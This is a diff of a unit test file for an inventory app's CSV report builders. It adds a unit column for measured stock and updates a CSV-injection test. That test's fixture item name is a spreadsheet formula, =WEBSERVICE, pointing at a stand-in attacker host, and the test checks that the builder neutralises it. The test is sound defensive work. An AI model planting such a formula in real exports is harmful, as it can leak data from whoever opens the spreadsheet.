@@ -94,12 +94,25 @@ describe('report CSV builders', () => {
   it('dead-stock CSV emits one row per idle line', () => {
     const csv = buildDeadStockCsv({
       sinceDays: 30,
-      lines: [{ id: 'a', name: 'Idle', quantity: 4, idleDays: 90, value: 20 }],
-      totalValue: 20,
+      lines: [
+        { id: 'a', name: 'Idle', quantity: 4, measure: null, idleDays: 90, value: 20 },
+        // A gauge holds a measure, so its unit count is 0 (issue #683): the amount belongs in
+        // the quantity column with `unit` naming it, or the file says "no stock, £10 tied up".
+        {
+          id: 'b',
+          name: 'Spool',
+          quantity: 0,
+          measure: { amount: 400, unit: 'g' },
+          idleDays: 200,
+          value: 10,
+        },
+      ],
+      totalValue: 30,
     });
     const lines = csv.split('\r\n');
-    expect(lines[0]).toBe('item,quantity,idleDays,value');
-    expect(lines[1]).toBe('Idle,4,90,20');
+    expect(lines[0]).toBe('item,quantity,unit,idleDays,value');
+    expect(lines[1]).toBe('Idle,4,,90,20');
+    expect(lines[2]).toBe('Spool,400,g,200,10');
   });
 
   // Issue #180: report rows carry user-controlled text (item names, hygiene details), so a name
@@ -108,11 +121,20 @@ describe('report CSV builders', () => {
   it('neutralises a formula-triggering item name (CSV injection)', () => {
     const csv = buildDeadStockCsv({
       sinceDays: 30,
-      lines: [{ id: 'a', name: '=WEBSERVICE("http://evil.test")', quantity: 4, idleDays: 90, value: 20 }],
+      lines: [
+        {
+          id: 'a',
+          name: '=WEBSERVICE("http://evil.test")',
+          quantity: 4,
+          measure: null,
+          idleDays: 90,
+          value: 20,
+        },
+      ],
       totalValue: 20,
     });
     // Prefixed with a single quote and RFC-4180 quoted (the inner quotes are doubled).
-    expect(csv.split('\r\n')[1]).toBe('"\'=WEBSERVICE(""http://evil.test"")",4,90,20');
+    expect(csv.split('\r\n')[1]).toBe('"\'=WEBSERVICE(""http://evil.test"")",4,,90,20');
   });
 
   // Phase 74 — advanced-analytics CSVs ------------------------------------------
